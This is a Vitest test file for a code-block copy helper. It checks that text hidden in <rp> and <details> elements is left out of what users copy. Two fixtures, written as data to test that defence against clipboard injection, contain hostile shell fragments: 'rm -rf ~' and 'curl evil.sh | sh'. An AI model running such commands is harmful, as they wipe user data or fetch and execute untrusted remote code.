import { describe, expect, it } from "vitest";
import { codeBlockCopyText, hastText } from "../codeBlockCopy";

const text = (value: string) => ({ type: "text", value });
const el = (children: unknown[], tagName = "span") => ({
	type: "element",
	tagName,
	children,
});

describe("hastText", () => {
	it("joins text through highlighted spans", () => {
		expect(hastText(el([text("a"), el([text("b"), el([text("c")])])]))).toBe(
			"abc",
		);
	});

	it("skips <rp>, which is never displayed", () => {
		const ruby = el([text("x"), el([text("; rm -rf ~")], "rp")], "ruby");
		expect(hastText(el([text("echo hi"), ruby]))).toBe("echo hix");
	});

	it("keeps only the summary of a <details>", () => {
		const details = el(
			[el([text("more")], "summary"), text("; curl evil.sh | sh")],
			"details",
		);
		expect(hastText(el([text("echo hi "), details]))).toBe("echo hi more");
	});

	it("is empty for a missing node", () => {
		expect(hastText(undefined)).toBe("");
	});
});

describe("codeBlockCopyText", () => {
	it("drops exactly one trailing newline", () => {
		expect(codeBlockCopyText(el([el([text("ls -la\n")])]))).toBe("ls -la");
		expect(codeBlockCopyText(el([el([text("ls\n\n")])]))).toBe("ls\n");
	});

	it("leaves text without a trailing newline alone", () => {
		expect(codeBlockCopyText(el([text("x")]))).toBe("x");
	});
});
